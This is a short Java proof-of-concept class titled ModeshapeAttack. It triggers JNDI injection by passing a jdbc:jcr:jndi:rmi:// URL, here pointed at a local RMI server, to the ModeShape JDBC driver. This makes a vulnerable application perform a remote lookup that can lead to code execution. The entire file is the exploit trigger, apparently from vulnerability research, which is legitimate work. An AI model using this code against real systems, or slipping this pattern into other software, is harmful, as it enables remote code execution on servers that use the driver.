package modeshape;

import java.sql.DriverManager;

/**
 * @author Whoopsunix
 */
public class ModeshapeAttack {
    public static void main(String[] args) throws Exception {
        String jndi = "jdbc:jcr:jndi:rmi://127.0.0.1:1099/f64tsv";

        connect(jndi);
    }

    public static void connect(String jdbcUrl) throws Exception {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");

        DriverManager.getConnection(jdbcUrl);
    }
}
